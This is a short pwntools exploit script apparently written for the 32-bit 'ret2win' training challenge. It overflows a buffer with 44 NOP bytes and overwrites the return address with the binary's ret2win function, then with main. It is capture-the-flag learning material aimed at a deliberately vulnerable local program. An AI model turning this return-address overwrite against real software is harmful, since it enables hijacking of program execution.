#!/usr/bin/env python3

from pwn import *

exe = './ret2win32'
elf= context.binary = ELF(exe,checksec=False)
context.log_level='debug'

io = process(exe)

padding = 44

payload = flat(
    asm('nop')*padding, # overflow to reach EIP
    elf.symbols.ret2win, # address in EIP
    elf.symbols.main #return address of pwnme()
)

io.sendlineafter(b'>',payload)
io.interactive()
